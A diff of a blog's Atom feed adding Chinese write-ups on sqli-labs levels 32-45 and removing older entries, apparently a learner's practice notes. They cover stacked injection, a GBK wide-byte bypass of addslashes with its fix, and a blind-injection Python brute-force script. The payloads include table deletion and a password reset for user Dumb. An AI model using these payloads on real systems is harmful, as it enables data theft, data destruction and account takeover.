@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-24T09:27:32.545Z</updated>
+  <updated>2022-02-25T08:48:22.587Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,71 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>堆叠注入（less38~45）</title>
+    <link href="http://example.com/2022/02/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>http://example.com/2022/02/25/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
+    <published>2022-02-25T07:30:00.000Z</published>
+    <updated>2022-02-25T08:48:22.587Z</updated>
+    
+    <content type="html"><![CDATA[<ul><li>原理介绍<br>在 SQL 中，分号 ； 是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br>例如以下这个例子：</li></ul><p>用户输入：<br>1; DELETE FROM products<br>服务器端生成的 sql 语句为：（因未对输入的参数进行过滤）<br>Select * from products where productid=1;DELETE FROM products</p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p><ul><li>堆叠注入的局限性<br>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</li></ul><p>新建一个表 select * from users where id=1;create table test like users;<br>此命令就在查询id为1的数据时也建立了一个test<br><img src="https://s2.loli.net/2022/02/25/T5YWfA6sKcXqhNO.png" alt="1.png"><br>修改数据 select * from users where id=1;insert into users(id,username,password) values(‘100’,’new’,’new’);<br><img src="https://s2.loli.net/2022/02/25/dgnPwEMeZI28Nz1.png" alt="2.png"></p><p>在less38<del>41中都是使用了堆叠注入的方式<br><img src="https://s2.loli.net/2022/02/25/5omqBGJu7Zr3DhP.png" alt="3.png"><br>而less42</del>45中的格式与less24的类似但是点击新建用时无法进行</p><p><img src="https://s2.loli.net/2022/02/25/QHBThRuijYM6aUg.png" alt="4.png"></p><p>，并且观察源码后能够发现对与账户及密码都进行了过滤，不能像less24去二次注入修改密码。<br><img src="https://s2.loli.net/2022/02/25/GJeVhcp7sX3z6vZ.png" alt="6.png"><br>但less42中有错误回显，可以进行报错来爆破。当然这里使用堆叠才符合题意。<br><img src="https://s2.loli.net/2022/02/25/dSqN3uIzYc4p8E6.png" alt="5.png"><br>使用<br>    1’;update users set password=’hello’ where username=’Dumb’ #<br>来将dumb的密码修改为hello，来使我们能够登入其账号。<br><img src="https://s2.loli.net/2022/02/25/czj24HLWUd3TRBs.png" alt="7.png"></p><p><img src="https://s2.loli.net/2022/02/25/fV9jU8vLRomJ6cP.png" alt="8.png"><br>less43与less42相似</p><p>本关是基于盲注的，这里盲注主要是要没有报错信息，所以要采用盲注。这关与 42 关的区<br>别就在于没有报错信息，当 POST 没有报错回显时，判断查询语句就需要构造永真条件同化登录失败与查询出错，通过返回的图片不同来确定是否符合查询语句闭合的条件：</p><p>如果登录失败，可以看到这样的页面：<br><img src="https://s2.loli.net/2022/02/25/VToqfnzg4N5bM32.png" alt="9.png"></p><p>用万能密码：1’or1=1#登入即可登入成功然后推断出闭合条件后即可进行与上题一样的注入方式<img src="https://s2.loli.net/2022/02/25/7wk3m4PTgJvdrIi.png" alt="10.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ul&gt;
+&lt;li&gt;原理介绍&lt;br&gt;在 SQL 中，分号 ； 是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection （联合注入）也是将两条语句合并在一起，</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>宽字节注入（less32 33 34  35 36 37的解法）</title>
+    <link href="http://example.com/2022/02/25/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+    <id>http://example.com/2022/02/25/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
+    <published>2022-02-25T00:57:49.000Z</published>
+    <updated>2022-02-25T01:14:17.658Z</updated>
+    
+    <content type="html"><![CDATA[<p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’。<br>PHP 自带一些转义特殊字符的函数，如addslashes()，mysql_real_escape_string()，mysql_escape_string()等，这些函数可用来防止 SQL 注入。</p><p>  如id=1’or’1’=’1，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符\，变为1&#39;or&#39;1&#39;=&#39;1，如此在 SQL 查询中是一个普通的字符串，不能进行注入。<br>  而网站在过滤’的时候，通常的思路就是将’转换为&#39;,因此我们在此想办法将’前面添加的\去掉，一般有两种思路：</p><ul><li>%bb吃掉<br>如果程序的默认字符集是GBK等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。<br>若在 PHP 中使用mysql_query(“set names gbk”)将默认字符集设为GBK，而使用addslashes()转义用户输入，这时如果用户输入%bb%27，则addslashes()会在%27前面加上一个%5c字符，即转义字符\。<br>而 MySQL 在使用GBK编码时，会认为两个字符为一个汉字，%bb%5c是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是籠，也就是说%bb%5c%27=籠’，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。%bb并不是唯一一个可以产生宽字节注入的字符，理论上%81-%FE均可。</li></ul><ul><li>过滤&#39;中的<br>构造%bb%5c%5c%27，addslashes()会在两个%5c和%27前都加上\即%5c，变为%bb %5c%5c %5c%5c %5c%27，但宽字符集认为%bb%5c是一个字符即籠，则变为%bb%5c %5c%5c %5c%5c %27即籠\\‘，四个\正好转义为两个\，即’未被转义。这也是 bypass 的一种方法。</li></ul><p>之后less 32 less 33 less 34 less35 less36 less37都会使用这种方式来消除转义字符。</p><p>0x02：宽字符注入的修复<br>先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string函数来过滤用户输入。</p><p>（也就是说，先不进行转义，首先以GBK编码的形式对提交上来的参数进行编码，然后再进行转义，（先编码也意味着反斜杠即5c不会出现，到下一步的转义引号才出现）这就造成了编码过后转义引号的反斜杠即字符5c不会和字符df变成一个宽字符，阻止了df 和 5c 的拼接，于是防宽字符注入成功）<br>————————————————</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105933348"><em>原文链接</em></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将‘转换为\’。&lt;br&gt;PHP 自带一些转义特殊字符的函数，如addslashe</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>判断过滤</title>
+    <link href="http://example.com/2022/02/25/%E5%B0%8F%E6%8F%90%E7%A4%BA/"/>
+    <id>http://example.com/2022/02/25/%E5%B0%8F%E6%8F%90%E7%A4%BA/</id>
+    <published>2022-02-25T00:46:25.000Z</published>
+    <updated>2022-02-25T01:03:42.803Z</updated>
+    
+    <content type="html"><![CDATA[<p>小提示：</p><p>如何判断数字型or被过滤</p><p>而没有错误回显时，我们又应该怎么判断是数字型注入还是引号被过滤呢？</p><p>在能分辨出正确回显和错误回显（有固定字符串）时，id=1正确回显，尝试id=1’和id=1”：</p><p>若两者都正确回显：很可能是被过滤引号<br>若两者都错误回显：很可能是数字型查询<br>若一正确一错误：基本可确定是字符型查询</p><p>通过此判断less 35 的为数字型查询，因此题目过滤’我们即可忽略<br>————————————————</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105923551"><em>原文链接</em></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;小提示：&lt;/p&gt;
+&lt;p&gt;如何判断数字型or被过滤&lt;/p&gt;
+&lt;p&gt;而没有错误回显时，我们又应该怎么判断是数字型注入还是引号被过滤呢？&lt;/p&gt;
+&lt;p&gt;在能分辨出正确回显和错误回显（有固定字符串）时，id=1正确回显，尝试id=1’和id=1”：&lt;/p&gt;
+&lt;p&gt;若两者都正确回显：</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>less29 less30  less31</title>
@@ -364,59 +429,6 @@ f</summary>
       
       
     <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>My New Post</title>
-    <link href="http://example.com/1970/01/01/My-New-Post/"/>
-    <id>http://example.com/1970/01/01/My-New-Post/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-10-09T01:50:45.158Z</updated>
-    
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>easy sql</title>
-    <link href="http://example.com/1970/01/01/easy%20sql/"/>
-    <id>http://example.com/1970/01/01/easy%20sql/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-13T09:03:03.383Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png" alt="1"><br>由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值<br><img src="https://i.loli.net/2021/11/13/C2sXQnDSt5i4rZ1.png" alt="2"><br>由打入1’可知进入数据库的数据有’  ‘ 包裹<br>在地址后输入：?wllm=-1’ union select 1,2,database()–+以此来查询库的位置database（）即打印库的位置，–+注释了输入数据之后’limit0，1，以此来显示出自己查表所显示的数值<br><img src="https://i.loli.net/2021/11/13/OmGi7adEkJX1sUL.png" alt="3"><br>之后查表输入：?wllm=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() –+<br><img src="https://i.loli.net/2021/11/13/GM4PJy1KHIFbrNA.png" alt="4"><br>查到表后猜测相应的flag在test_tb中<br>差表中数据输入：?wllm=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’test_tb’ –+<br><img src="https://i.loli.net/2021/11/13/tPvE9qOQo8UR3mk.png" alt="5"><br>最后就是输出flag中的数据<br>输入：?wllm=-1’ union select 1,2,group_concat(flag)from test_tb –+<br><img src="https://i.loli.net/2021/11/13/HPCzUR1A76wlgmG.png" alt="6"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>less 8</title>
-    <link href="http://example.com/1970/01/01/less8/"/>
-    <id>http://example.com/1970/01/01/less8/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-21T03:22:31.991Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
       
     
     
